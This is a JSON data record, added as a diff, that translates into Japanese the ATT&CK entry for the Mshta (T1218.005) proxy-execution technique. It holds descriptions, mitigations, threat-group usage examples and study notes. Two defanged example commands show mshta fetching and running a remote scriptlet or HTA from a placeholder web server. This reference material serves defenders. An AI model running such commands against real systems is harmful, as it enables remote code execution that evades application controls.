@@ -1,0 +1,48 @@
+{
+ "id": "T1218.005",
+ "source_sha": "4eeae218b0bbbd91",
+ "status": "done",
+ "seg": {
+  "name": "Mshta",
+  "description/0": "攻撃者は、mshta.exeを悪用し、信頼されたWindowsユーティリティを経由して悪意ある.htaファイルやJavaScript・VBScriptの実行を代理させることがある。初期侵害の際や、コードの実行のためにmshta.exeを利用する、さまざまな種類の脅威の例が複数存在する。",
+  "description/1": "Mshta.exeは、Microsoft HTML Applications（HTA）ファイルを実行するユーティリティである。HTAは、Internet Explorerと同じモデルや技術を使って実行される単独のアプリケーションだが、ブラウザの外で動作する。",
+  "description/2": "ファイルは、mshta.exeによってインラインスクリプトを通じて実行されることがある：`mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))`",
+  "description/3": "URLから直接実行されることもある：`mshta http[:]//webserver/payload[.]hta`",
+  "description/4": "Mshta.exeは、その潜在的な使用を想定していないアプリケーション制御のしくみを回避するために使われることがある。mshta.exeはInternet Explorerのセキュリティコンテキストの外で実行されるため、ブラウザのセキュリティ設定も回避する。",
+  "mitigation/M1038/0": "mshta.exeの実行が特定のシステムやネットワークで必要ない場合は、アプリケーション制御を設定してその実行を遮断し、攻撃者による悪用の可能性を防ぐ。例えば、Windows 10およびWindows Server 2016以降では、Windows Defender Application Control（WDAC）のポリシー規則を適用して`mshta.exe`アプリケーションを遮断し、悪用を防ぐことができる。",
+  "mitigation/M1042/0": "mshta.exeの機能は、サポートが終了した古いバージョンのInternet Explorerに結び付いているため、環境によっては不要な場合がある。",
+  "procedure/G0016/0": "APT29は、侵害したホスト上で悪意あるスクリプトを実行するために`mshta`を使用した。",
+  "procedure/G0032/0": "Lazarus Groupは、初期アクセス用の文書によってダウンロードされたHTMLページを実行するために`mshta.exe`を使用した。",
+  "procedure/G0046/0": "FIN7は、被害システム上で悪意あるコードを実行するVBScriptを実行するためにmshta.exeを使用した。",
+  "procedure/G0047/0": "Gamaredon Groupは、悪意あるファイルを実行するために`mshta.exe`を使用した。",
+  "procedure/G0050/0": "APT32は、コード実行のためにmshta.exeを使用した。",
+  "procedure/G0069/0": "MuddyWaterは、POWERSTATSペイロードを実行するため、またPowerShellのワンライナーを渡して実行するためにmshta.exeを使用した。",
+  "procedure/G0082/0": "APT38は、悪意あるHTMLファイルを実行するために名前を変更した`mshta.exe`を使用した。",
+  "procedure/G0094/0": "Kimsukyは、システム上で悪意あるスクリプトを実行するためにmshta.exeを使用した。",
+  "procedure/G0100/0": "Inceptionは、マルウェアをドロップ・実行するために悪意あるHTAファイルを使用した。",
+  "procedure/G0121/0": "Sidewinderは、悪意あるペイロードを実行するために`mshta.exe`を使用した。",
+  "procedure/G0127/0": "TA551は、悪意あるペイロードを実行するためにmshta.exeを使用した。",
+  "procedure/G0129/0": "Mustang Pandaは、収集用のスクリプトを起動するためにmshta.exeを使用した。",
+  "procedure/G0140/0": "LazyScripterは、Koadicのステージャーを実行するために`mshta.exe`を使用した。",
+  "procedure/G0142/0": "Confuciusは、悪意あるVBScriptを実行するためにmshta.exeを使用した。",
+  "procedure/G1006/0": "Earth Luscaは、悪意ある.LNKファイル内のHTAスクリプトを読み込むために`mshta.exe`を使用した。",
+  "procedure/G1008/0": "SideCopyは、悪意あるhtaファイルを実行するために`mshta.exe`を利用した。",
+  "procedure/G1018/0": "TA2541は、VBSを含むスクリプトを実行するために`mshta`を使用した。",
+  "procedure/S0147/0": "Pteranodonは、遠隔サーバー上にホストされたHTAファイルを実行するためにmshta.exeを使用できる。",
+  "procedure/S0223/0": "POWERSTATSは、侵害したホスト上で追加のペイロードを実行するためにMshta.exeを使用できる。",
+  "procedure/S0228/0": "NanHaiShuは、自身のプログラムとファイルを読み込むためにmshta.exeを使用する。",
+  "procedure/S0250/0": "Koadicは、追加のペイロードを提供するため、また持続化のためのタスクのスケジュール設定を助けるためにmshtaを使用できる。",
+  "procedure/S0341/0": "Xbashは、スクリプトの実行にmshtaを使用できる。"
+ },
+ "supplement": {
+  "summary": "Windows標準のHTAファイル実行ユーティリティmshta.exeを悪用し、Internet Explorerのセキュリティコンテキストの外でスクリプトを実行させる、広く使われているサブ技術。実例の多さ（本データでも20件超）は、この手口が攻撃者の間で定番化していることを示す。",
+  "analogy": "正規の受付窓口（mshta.exe）が、本来はビルの案内用アプリ（HTAファイル）を動かすためのものなのに、その窓口を通せばビルのセキュリティゲート（ブラウザのセキュリティ設定）を一切通らずに別のフロアへ行けてしまう、という設計上の抜け穴に当たる。",
+  "learn": [
+   "mshta.exeが、ブラウザのセキュリティコンテキストの外で動くという特性ゆえに、ブラウザ向けの防御策をすべて回避できてしまうこと",
+   "この技術が極めて多数の攻撃グループ・マルウェアに使われている、定番の環境寄生型(LOLBins)手口であること"
+  ],
+  "interpretation": [
+   "対策がmshta.exe自体の遮断・削除にとどまるのは、mshta.exeの機能が既にサポート終了した古いInternet Explorerの技術基盤に依存しており、現代の環境では本来不要であることが多いためである。つまり、この技術への最も効果的な対策は、脆弱性の修正ではなく、不要な正規機能そのものを環境から取り除くという判断である。"
+  ]
+ }
+}
